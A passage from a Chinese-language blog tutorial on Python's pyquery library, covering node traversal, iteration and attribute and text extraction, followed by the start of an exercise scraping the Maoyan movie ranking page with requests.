class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这里首先用.list选取class为list的节点，然后调用parent()方法得到其父节点</p>
<p>这里的父节点是该节点的直接父节点，也就是说它不会再去查找父节点的父节点，即祖先节点</p>
<p>如果想要获取祖先节点，可以用parents()方法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">items = doc(<span class="string">'.list'</span>)</span><br><span class="line">parents = items.parents()</span><br><span class="line">print(type(parents))</span><br><span class="line">print(parents)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">pyquery</span>.<span class="title">pyquery</span>.<span class="title">PyQuery</span>'&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span></span>=<span class="string">"wrap"</span>&gt;</span><br><span class="line">    &lt;div id=<span class="string">"container"</span>&gt;</span><br><span class="line">        &lt;ul <span class="class"><span class="keyword">class</span></span>=<span class="string">"list"</span>&gt;</span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0"</span>&gt;first item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">             &lt;li class="item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/</span>a&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-1 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">         &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">     &lt;/</span>div&gt;</span><br><span class="line"> &lt;<span class="regexp">/div&gt;&lt;div id="container"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;ul class="list"&gt;</span></span><br><span class="line"><span class="regexp">             &lt;li class="item-0"&gt;first item&lt;/</span>li&gt;</span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-1"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-1 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">         &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">     &lt;/</span>div&gt;</span><br></pre></td></tr></table></figure>
<p>输出结果可以看到有两个，一个是class为wrap的节点，一个是id为container的节点，也就是说parents()方法会返回所有的祖先节点</p>
<p>如果想要筛选某个祖先节点的话，可以向parents()方法传入CSS选择器，这样就会返回祖先节点中CSS选择器的节点：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">parents = items.parents(<span class="string">'.wrap'</span>)</span><br><span class="line">print(parents)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"wrap"</span>&gt;</span><br><span class="line">    &lt;div id=<span class="string">"container"</span>&gt;</span><br><span class="line">        &lt;ul <span class="class"><span class="keyword">class</span></span>=<span class="string">"list"</span>&gt;</span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0"</span>&gt;first item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">             &lt;li class="item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/</span>a&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-1 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">         &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">     &lt;/</span>div&gt;</span><br><span class="line"> &lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure><br>这样就只会输出wrap这个祖先节点了</p>
<h3 id="兄弟节点"><a href="#兄弟节点" class="headerlink" title="兄弟节点"></a>兄弟节点</h3><p>如果想要查询兄弟节点，那就可以使用siblings()方法<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">li = doc(<span class="string">'.list .item-0.active'</span>)</span><br><span class="line">print(li.siblings())</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-1"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0"</span>&gt;first item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">             &lt;li class="item-1 active"&gt;&lt;a href="link4.html"&gt;fourth item&lt;/</span>a&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>item-0的兄弟节点有4个，所以输出了所有满足条件的li节点</p>
<p>如果想要筛选某个兄弟节点，只需传入CSS选择器<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">li = doc(<span class="string">'.list .item-0.active'</span>)</span><br><span class="line">print(li.siblings(<span class="string">'.active'</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-1 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这里就只输出的class为active的节点</p>
<h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><p>对于单个节点来说，可以直接打印输出，也可以直接转成字符串：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">li = doc(<span class="string">'.item-0.active'</span>)</span><br><span class="line">print(li)</span><br><span class="line">print(str(li))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             </span><br><span class="line">&lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>多个节点的结果，就需要遍历来获取了，我们需要调用items()方法<br><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">from pyquery import PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(html)</span><br><span class="line"><span class="keyword">lis</span> = doc('<span class="keyword">li</span>').items()</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">type</span>(<span class="keyword">lis</span>))</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">li</span> <span class="keyword">in</span> <span class="keyword">lis</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="keyword">li</span>, <span class="keyword">type</span>(<span class="keyword">li</span>))</span><br><span class="line">    </span><br><span class="line">输出结果：</span><br><span class="line">&lt;<span class="keyword">class</span> 'generator'&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-0"</span>&gt;first item&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">class</span> 'pyquery.pyquery.PyQuery'&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-1"</span>&gt;&lt;a href=<span class="string">"link2.html"</span>&gt;second item&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">class</span> 'pyquery.pyquery.PyQuery'&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-0 active"</span>&gt;&lt;a href=<span class="string">"link3.html"</span>&gt;&lt;span <span class="keyword">class</span>=<span class="string">"bold"</span>&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">class</span> 'pyquery.pyquery.PyQuery'&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-1 active"</span>&gt;&lt;a href=<span class="string">"link4.html"</span>&gt;fourth item&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">class</span> 'pyquery.pyquery.PyQuery'&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-0"</span>&gt;&lt;a href=<span class="string">"link5.html"</span>&gt;fifth item&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">          &lt;<span class="keyword">class</span> 'pyquery.pyquery.PyQuery'&gt;</span><br></pre></td></tr></table></figure><br>调用items()方法后，会得到一个生成器，遍历一下，就可以逐个得到li节点对象了</p>
<h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><h3 id="获取属性"><a href="#获取属性" class="headerlink" title="获取属性"></a>获取属性</h3><p>提到属性，基本上就与前面的一样使用attrs之类的方法，pyquery也不例外，使用attr()方法来获取<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">html = '''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrap"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line">from pyquery import PyQuery as pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">a = doc('.item-0.active a')</span><br><span class="line">print(a, type(a))</span><br><span class="line">print(a.attr('href'))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">class</span> '<span class="attr">pyquery.pyquery.PyQuery</span>'&gt;</span></span><br><span class="line">link3.html</span><br></pre></td></tr></table></figure><br>首先选中class为item-0和active的li节点内的a节点，它的类型是pyquery类型<br>然后调用attr()方法，再传入属性的名称，就可以得到这个属性的值</p>
<p>也可以调用attr属性来获取属性<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">print</span>(<span class="selector-tag">a</span><span class="selector-class">.attr</span><span class="selector-class">.href</span>)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="selector-tag">link3</span><span class="selector-class">.html</span></span><br></pre></td></tr></table></figure><br>这两种方法完全一样</p>
<p>attr()方法只会得到第一个节点的属性</p>
<p>想要获取所有a节点的属性，就要用到前面所说的遍历：<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">from</span> pyquery import PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(html)</span><br><span class="line"><span class="keyword">a</span> = doc(<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">item</span> <span class="keyword">in</span> <span class="keyword">a</span>.<span class="keyword">items</span>():</span><br><span class="line">    print(<span class="keyword">item</span>.attr(<span class="string">'href'</span>))</span><br><span class="line">    </span><br><span class="line">输出结果：</span><br><span class="line">link2.html</span><br><span class="line">link3.html</span><br><span class="line">link4.html</span><br><span class="line">link5.html</span><br></pre></td></tr></table></figure></p>
<h3 id="获取文本"><a href="#获取文本" class="headerlink" title="获取文本"></a>获取文本</h3><p>获取节点之后的另一个主要操作就是获取内部的文本了，我们可以调用text()方法来实现：<br><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">html = '''</span><br><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"wrap"</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">"container"</span>&gt;</span><br><span class="line">        &lt;ul <span class="built_in">class</span>=<span class="string">"list"</span>&gt;</span><br><span class="line">             &lt;li <span class="built_in">class</span>=<span class="string">"item-0"</span>&gt;<span class="keyword">first</span> <span class="built_in">item</span>&lt;/li&gt;</span><br><span class="line">             &lt;li <span class="built_in">class</span>=<span class="string">"item-1"</span>&gt;&lt;a href=<span class="string">"link2.html"</span>&gt;<span class="keyword">second</span> <span class="built_in">item</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">             &lt;li <span class="built_in">class</span>=<span class="string">"item-0 active"</span>&gt;&lt;a href=<span class="string">"link3.html"</span>&gt;&lt;span <span class="built_in">class</span>=<span class="string">"bold"</span>&gt;<span class="keyword">third</span> <span class="built_in">item</span>&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">             &lt;li <span class="built_in">class</span>=<span class="string">"item-1 active"</span>&gt;&lt;a href=<span class="string">"link4.html"</span>&gt;<span class="keyword">fourth</span> <span class="built_in">item</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">             &lt;li <span class="built_in">class</span>=<span class="string">"item-0"</span>&gt;&lt;a href=<span class="string">"link5.html"</span>&gt;<span class="keyword">fifth</span> <span class="built_in">item</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;/ul&gt;</span><br><span class="line">     &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line"> &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">'''</span><br><span class="line"><span class="keyword">from</span> pyquery import PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">a = doc('.<span class="built_in">item</span><span class="number">-0.</span>active a')</span><br><span class="line">print(a)</span><br><span class="line">print(a.<span class="built_in">text</span>())</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;a href=<span class="string">"link3.html"</span>&gt;&lt;span <span class="built_in">class</span>=<span class="string">"bold"</span>&gt;<span class="keyword">third</span> <span class="built_in">item</span>&lt;/span&gt;&lt;/a&gt;</span><br><span class="line"><span class="keyword">third</span> <span class="built_in">item</span></span><br></pre></td></tr></table></figure></p>
<h1 id="抓取猫眼电影排行"><a href="#抓取猫眼电影排行" class="headerlink" title="抓取猫眼电影排行"></a>抓取猫眼电影排行</h1><p>因为这周目标只想把解析器结束，所以看的不是很多，打算做一个简单的实验，抓取一下猫眼电影的排行</p>
<h2 id="抓取分析"><a href="#抓取分析" class="headerlink" title="抓取分析"></a>抓取分析</h2><p>访问站点<a href="https://maoyan.com/board/4,打开之后便可以查看到榜单信息" target="_blank" rel="noopener">https://maoyan.com/board/4,打开之后便可以查看到榜单信息</a><br><img src="/images/python3/maoyan0.png" alt="avatar"></p>
<p>接下来换页，发现URL变成了<a href="https://maoyan.com/board/4?offset=10" target="_blank" rel="noopener">https://maoyan.com/board/4?offset=10</a></p>
<p>URL比之前多了一个参数，而结果显示的是排行11-20名的电源，所以推断这个是一个偏移量的参数，如果排行是21-30的电影的话，参数就会变为20</p>
<h2 id="抓取首页"><a href="#抓取首页" class="headerlink" title="抓取首页"></a>抓取首页</h2><p>爬取内容之前，先用抓取源码测试一下是否连通<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="attribute">url</span>=<span class="string">"https://maoyan.com/board/4?offset=0"</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">response</span>=requests.get(url,headers=headers)</span><br><span class="line"><span class="keyword">if</span> response.<span class="attribute">status_code</span>==200:</span><br><span class="line">    <span class="builtin-name">print</span>(response.text)</span><br></pre></td></tr></table></figure><br>运行之后就可以得到源码，证明可以抓取到</p>
<h2 id="正则提取"><a href="#正则提取" class="headerlink" title="正则提取"></a>正则提取</h2><p>F12打开开发者工具，在Network监听组件中，就可以查看到源代码</p>
<p>利用霸王别姬的来做分析<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"> <span class="tag">&lt;<span class="name">dd</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"board-index board-index-1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/films/1203"</span> <span class="attr">title</span>=<span class="string">"霸王别姬"</span> <span class="attr">class</span>=<span class="string">"image-link"</span> <span class="attr">data-act</span>=<span class="string">"boarditem-click"</span> <span class="attr">data-val</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;movieId:1203&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"//s3plus.meituan.net/v1/mss_e2821d7f0cfe4ac1bf9202ecf9590e67/cdn-prod/file:5788b470/image/loading_2.e3d934bf.png"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"poster-default"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"https://p0.meituan.net/movie/ce4da3e03e655b5b88ed31b5cd7896cf62472.jpg@160w_220h_1e_1c"</span> <span class="attr">alt</span>=<span class="string">"霸王别姬"</span> <span class="attr">class</span>=<span class="string">"board-img"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"board-item-main"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"board-item-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"movie-item-info"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"name"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/films/1203"</span> <span class="attr">title</span>=<span class="string">"霸王别姬"</span> <span class="attr">data-act</span>=<span class="string">"boarditem-click"</span> <span class="attr">data-val</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;movieId:1203&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>霸王别姬<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"star"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                主演：张国荣,张丰毅,巩俐</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"releasetime"</span>&gt;</span>上映时间：1993-07-26<span class="tag">&lt;/<span class="name">p</span>&gt;</span>    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"movie-item-number score-num"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"score"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"integer"</span>&gt;</span>9.<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fraction"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>        </span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>可以看到与这个排行相关的都套在一个dd节点中</p>
